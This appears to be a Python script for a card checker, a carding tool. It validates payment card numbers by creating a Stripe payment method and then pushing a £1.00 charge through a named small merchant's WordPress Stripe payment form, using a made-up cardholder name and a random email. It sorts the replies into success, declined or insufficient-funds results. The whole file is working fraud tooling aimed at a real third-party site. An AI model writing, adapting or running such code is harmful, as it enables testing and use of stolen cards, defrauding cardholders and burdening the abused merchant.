import requests
import random

def Tele(ccx):
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return "Invalid format. Use: card|mm|yy|cvv"
        
        n = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3]
        
        # Format year properly
        if len(yy) == 4:
            yy = yy[2:]
        
        r = requests.session()
        
        # Generate random email
        random_amount1 = random.randint(1, 4)
        random_amount2 = random.randint(1, 99)
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # You NEED to replace this with a valid Stripe key
        stripe_key = "pk_live_YOUR_VALID_KEY_HERE"  # REPLACE THIS!
        
        data = f'type=card&billing_details[name]=John+Doe&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js&key={stripe_key}'
        
        # Step 1: Create payment method
        response = requests.post('https://api.stripe.com/v1/payment_methods', 
                                headers=headers, data=data, timeout=10)
        
        if response.status_code != 200:
            return f"Stripe API Error: {response.status_code}"
        
        resp_json = response.json()
        
        if 'error' in resp_json:
            error_msg = resp_json['error'].get('message', 'Unknown Stripe error')
            if 'card_declined' in error_msg.lower():
                return "Card declined by issuer"
            elif 'invalid' in error_msg.lower():
                return "Invalid card details"
            elif 'incorrect' in error_msg.lower():
                return "Incorrect card details"
            else:
                return f"Stripe Error: {error_msg}"
        
        if 'id' not in resp_json:
            return "No payment method ID returned"
        
        pm = resp_json['id']
        
        # Step 2: Attempt charge
        headers2 = {
            'authority': 'www.perhamvillage.co.uk',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.perhamvillage.co.uk',
            'referer': 'https://www.perhamvillage.co.uk/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        data2 = {
            'action': 'wp_full_stripe_inline_payment_charge',
            'wpfs-form-name': 'PayServiceCharge',
            'wpfs-form-get-parameters': '{}',
            'wpfs-custom-amount-unique': '1.00',  # Changed to £1.00
            'wpfs-card-holder-email': f'test{random_amount1}{random_amount2}@example.com',
            'wpfs-card-holder-name': 'John Doe',
            'wpfs-stripe-payment-method-id': pm,
        }
        
        response2 = requests.post('https://www.perhamvillage.co.uk/wp-admin/admin-ajax.php',
                                 headers=headers2, data=data2, timeout=10)
        
        if response2.status_code != 200:
            return f"Merchant Error: {response2.status_code}"
        
        try:
            resp2_json = response2.json()
            if 'message' in resp2_json:
                result = resp2_json['message']
                
                # Parse common responses
                if 'success' in result.lower():
                    return "Payment Successful!"
                elif 'declined' in result.lower():
                    return "Card declined"
                elif 'insufficient' in result.lower():
                    return "Insufficient funds"
                elif 'security code' in result.lower():
                    return "Security code is incorrect"
                else:
                    return result
            else:
                return "No message in response"
                
        except:
            return "Invalid JSON from merchant"
            
    except requests.exceptions.Timeout:
        return "Timeout error"
    except requests.exceptions.ConnectionError:
        return "Connection error"
    except Exception as e:
        return f"Processing error: {str(e)}"
